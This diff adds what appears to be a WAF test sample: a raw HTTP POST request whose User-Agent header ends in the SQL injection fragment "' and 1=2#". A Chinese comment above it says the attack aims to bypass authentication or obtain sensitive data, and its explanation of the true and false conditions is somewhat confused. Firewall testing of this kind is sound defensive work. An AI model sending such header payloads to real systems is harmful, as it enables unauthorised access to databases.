@@ -1,0 +1,10 @@
+# SQL注入_POST_通用_请求头注入_User-Agent
+# 基于请求头注入，在http请求的User-agent中的插入sql注入语句，该sql注入语句攻击的目的是尝试绕过身份验证或者获取敏感信息。通过将"1 and 1=2#"附加到原始的用户代理字符串中，攻击者试图构造一个永远为假的条件，以绕过应用程序对用户身份验证的检查或过滤。这可能实现了1=1这个永真条件的预期结果不满足，导致应用程序认为用户身份验证失败。
+POST /?bid=hd_tag_m8mv24ar HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24ar
+RM-PRO-Token: ce18fcbef421698a6c0b139605f8e40c
+RM-PRO-Time: 1742808372089
+User-Agent: curl/7.83.1
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0' and 1=2#
+
